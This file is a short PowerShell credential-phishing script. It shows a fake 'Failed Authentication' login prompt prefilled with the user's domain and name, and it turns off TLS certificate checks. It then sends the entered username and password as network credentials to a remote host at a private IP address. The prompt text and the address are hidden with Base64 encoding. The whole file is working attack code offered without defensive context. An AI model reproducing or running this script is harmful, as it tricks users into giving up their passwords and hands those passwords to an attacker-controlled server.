﻿$cred = $host.ui.promptforcredential($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4A'))),'',[Environment]::UserDomainName + "\" + [Environment]::UserName,[Environment]::UserDomainName);
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
$wc = new-object net.webclient;
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, '');
$result = $wc.downloadstring($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvADEANwAyAC4AMQA2AC4AMQAwADIALgAxADYAMwA='))));


